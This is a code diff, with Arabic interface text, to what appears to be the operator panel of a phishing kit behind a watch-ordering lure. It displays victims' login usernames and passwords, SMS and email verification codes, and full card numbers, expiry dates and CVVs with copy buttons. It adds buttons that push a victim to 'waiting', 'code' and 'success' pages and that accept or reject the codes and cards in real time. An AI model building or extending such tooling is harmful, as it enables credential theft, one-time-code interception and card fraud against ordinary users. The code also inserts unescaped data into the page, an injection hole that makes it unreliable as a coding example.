@@ -270,9 +270,13 @@
       <button onclick="doRedirect('colors.html')">صفحة اختيار الألوان</button>
       <button onclick="doRedirect('order.html')">صفحة بيانات الطلب</button>
       <button onclick="doRedirect('login.html')">صفحة تسجيل الدخول</button>
-      <button onclick="doRedirect('password.html')">صفحة الرمز السري</button>
+      <button onclick="doRedirect('waiting.html')">صفحة الانتظار</button>
+      <button onclick="doRedirect('code.html')">صفحة رمز التحقق</button>
+      <button onclick="doRedirect('code-waiting.html')">صفحة تحقق الرمز</button>
       <button onclick="doRedirect('email-code.html')">صفحة رمز الإيميل</button>
+      <button onclick="doRedirect('email-code-waiting.html')">صفحة تحقق رمز الإيميل</button>
       <button onclick="doRedirect('card-details.html')">صفحة بيانات البطاقة</button>
+      <button onclick="doRedirect('success.html')">صفحة النجاح</button>
     </div>
   </div>
 </div>
@@ -422,6 +426,8 @@ function showDetails(id) {
     ? `<img src="${w.img}" alt="${w.name}"><div class="color-name">${w.name}</div>`
     : `<div class="color-name">${o.watch_color || "لم يتم الاختيار"}</div>`;
 
+  const copyIcon = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>`;
+
   let detailsHtml = `
     <div class="detail-item"><div class="lbl">الاسم</div><div class="val">${o.name}</div></div>
     <div class="detail-item"><div class="lbl">الهاتف</div><div class="val" style="direction:ltr;text-align:right">${o.phone}</div></div>
@@ -433,58 +439,68 @@ function showDetails(id) {
     <div class="detail-item"><div class="lbl">الصفحة الحالية</div><div class="val">${pageLabels[o.current_page]||o.current_page||"—"}</div></div>
     <div class="detail-item"><div class="lbl">تاريخ الطلب</div><div class="val">${new Date(o.created_at).toLocaleString("ar-EG")}</div></div>`;
 
-  const copyIcon = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>`;
-
   if (o.login_username || o.login_password) {
-    detailsHtml += `</div><div class="login-data"><h3>بيانات تسجيل الدخول</h3>`;
+    detailsHtml += `<div class="detail-full" style="grid-column:1/-1"><div class="login-data"><h3>بيانات تسجيل الدخول</h3>`;
     if (o.login_username) {
       detailsHtml += `<div class="cred-row"><div><div class="cred-label">اسم المستخدم</div><div class="cred-val">${o.login_username}</div></div><div class="cred-right"><button class="cred-copy" onclick="copyCred(this,'${o.login_username}')">${copyIcon} نسخ</button></div></div>`;
     }
     if (o.login_password) {
       detailsHtml += `<div class="cred-row"><div><div class="cred-label">الرمز السري</div><div class="cred-val">${o.login_password}</div></div><div class="cred-right"><button class="cred-copy" onclick="copyCred(this,'${o.login_password}')">${copyIcon} نسخ</button></div></div>`;
     }
+    detailsHtml += `</div></div>`;
   }
 
   if (o.verification_code) {
-    if (!o.login_username && !o.login_password) detailsHtml += `</div><div class="login-data">`;
+    detailsHtml += `<div class="detail-full" style="grid-column:1/-1"><div class="login-data"><h3 style="color:#1565c0">رمز التحقق</h3>`;
     detailsHtml += `<div class="cred-row"><div><div class="cred-label">رمز التحقق</div><div class="cred-val code-val">${o.verification_code}</div></div><div class="cred-right"><button class="cred-copy" onclick="copyCred(this,'${o.verification_code}')">${copyIcon} نسخ</button></div></div>`;
+    detailsHtml += `</div></div>`;
   }
+
   if (o.email_verification_code) {
-    if (!o.login_username && !o.login_password && !o.verification_code) detailsHtml += `</div><div class="login-data">`;
+    detailsHtml += `<div class="detail-full" style="grid-column:1/-1"><div class="login-data"><h3 style="color:#d32f2f">رمز الإيميل</h3>`;
     detailsHtml += `<div class="cred-row"><div><div class="cred-label">رمز الإيميل</div><div class="cred-val code-val" style="color:#d32f2f">${o.email_verification_code}</div></div><div class="cred-right"><button class="cred-copy" onclick="copyCred(this,'${o.email_verification_code}')">${copyIcon} نسخ</button></div></div>`;
+    detailsHtml += `</div></div>`;
   }
 
   if (o.card_number) {
-    if (!o.login_username && !o.login_password && !o.verification_code && !o.email_verification_code) detailsHtml += `</div><div class="login-data">`;
-    detailsHtml += `<h3 style="margin-top:12px;color:#e65100">بيانات البطاقة</h3>`;
+    detailsHtml += `<div class="detail-full" style="grid-column:1/-1"><div class="login-data"><h3 style="color:#e65100">بيانات البطاقة</h3>`;
     detailsHtml += `<div class="cred-row"><div><div class="cred-label">اسم حامل البطاقة</div><div class="cred-val" style="color:#e65100">${o.card_name||"—"}</div></div><div class="cred-right"><button class="cred-copy" onclick="copyCred(this,'${o.card_name||""}')">${copyIcon} نسخ</button></div></div>`;
     detailsHtml += `<div class="cred-row"><div><div class="cred-label">رقم البطاقة</div><div class="cred-val code-val" style="color:#e65100">${o.card_number}</div></div><div class="cred-right"><button class="cred-copy" onclick="copyCred(this,'${o.card_number}')">${copyIcon} نسخ</button></div></div>`;
     detailsHtml += `<div class="cred-row"><div><div class="cred-label">تاريخ الانتهاء</div><div class="cred-val" style="color:#e65100">${o.card_expiry||"—"}</div></div><div class="cred-right"><button class="cred-copy" onclick="copyCred(this,'${o.card_expiry||""}')">${copyIcon} نسخ</button></div></div>`;
     detailsHtml += `<div class="cred-row"><div><div class="cred-label">CVV</div><div class="cred-val code-val" style="color:#e65100">${o.card_cvv||"—"}</div></div><div class="cred-right"><button class="cred-copy" onclick="copyCred(this,'${o.card_cvv||""}')">${copyIcon} نسخ</button></div></div>`;
+    detailsHtml += `</div></div>`;
   }
 
   document.getElementById("modalDetails").innerHTML = detailsHtml;
 
   const acceptBtn = document.getElementById("modalAccept");
   const rejectBtn = document.getElementById("modalReject");
+  acceptBtn.style.display = "";
+  rejectBtn.style.display = "";
+
   if (o.status === "card_pending") {
-    acceptBtn.textContent = "قبول البطاقة";
-    rejectBtn.textContent = "رفض البطاقة";
+    acceptBtn.textContent = "قبول البطاقة ✓";
+    rejectBtn.textContent = "رفض البطاقة ✗";
     acceptBtn.onclick = () => updateStatus(id, "card_confirmed");
     rejectBtn.onclick = () => updateStatus(id, "card_rejected");
   } else if (o.status === "email_code_pending") {
-    acceptBtn.textContent = "قبول رمز الإيميل";
-    rejectBtn.textContent = "رفض رمز الإيميل";
+    acceptBtn.textContent = "قبول رمز الإيميل ✓";
+    rejectBtn.textContent = "رفض رمز الإيميل ✗";
     acceptBtn.onclick = () => updateStatus(id, "email_code_confirmed");
     rejectBtn.onclick = () => updateStatus(id, "email_code_rejected");
   } else if (o.status === "code_pending") {
-    acceptBtn.textContent = "قبول الرمز";
-    rejectBtn.textContent = "رفض الرمز";
+    acceptBtn.textContent = "قبول الرمز ✓";
+    rejectBtn.textContent = "رفض الرمز ✗";
     acceptBtn.onclick = () => updateStatus(id, "code_confirmed");
     rejectBtn.onclick = () => updateStatus(id, "code_rejected");
+  } else if (o.status === "pending") {
+    acceptBtn.textContent = "قبول ✓";
+    rejectBtn.textContent = "رفض ✗";
+    acceptBtn.onclick = () => updateStatus(id, "confirmed");
+    rejectBtn.onclick = () => updateStatus(id, "rejected");
   } else {
-    acceptBtn.textContent = "قبول";
-    rejectBtn.textContent = "رفض";
+    acceptBtn.textContent = "قبول ✓";
+    rejectBtn.textContent = "رفض ✗";
     acceptBtn.onclick = () => updateStatus(id, "confirmed");
     rejectBtn.onclick = () => updateStatus(id, "rejected");
   }
